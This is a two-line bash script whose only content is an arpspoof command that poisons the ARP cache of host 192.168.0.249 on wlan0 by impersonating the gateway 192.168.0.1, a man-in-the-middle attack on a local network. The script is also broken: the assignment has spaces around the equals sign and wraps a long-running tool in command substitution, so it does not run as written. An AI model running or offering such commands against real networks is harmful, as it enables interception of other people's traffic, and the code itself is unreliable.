#!/bin/bash
arp = $(arpspoof -i wlan0 -t 192.168.0.249 192.168.0.1)